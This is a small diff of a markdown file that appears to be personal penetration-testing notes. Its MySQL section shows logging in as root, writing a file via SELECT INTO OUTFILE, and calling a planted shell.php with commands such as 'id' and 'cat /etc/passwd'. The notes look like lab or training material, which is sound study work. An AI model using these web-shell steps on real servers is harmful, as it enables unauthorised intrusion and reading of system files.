@@ -112,9 +112,10 @@
 # 6. Mysql <a name="mysql"></a>
 - `mysql -h 10.0.1.22 -u root`
     - select 'This is a test' into outfile '/tmp/test' from mysql.user limit 1;
-      - > if executed, confirms the ability to write files on the web server. Image1
+      - > if executed, confirms the ability to write files on the web server.
+        - ![image](https://github.com/Chittu13/web/blob/main/Image/mysql.png)
     - Now navigate to that path where you write the shell.php
-      - [image](https://github.com/Chittu13/web/blob/main/Image/mysql.png)
+
         - `<url>/shell.php?cmd=id`
         - `<url>/shell.php?cmd=cat /etc/passwd`
 
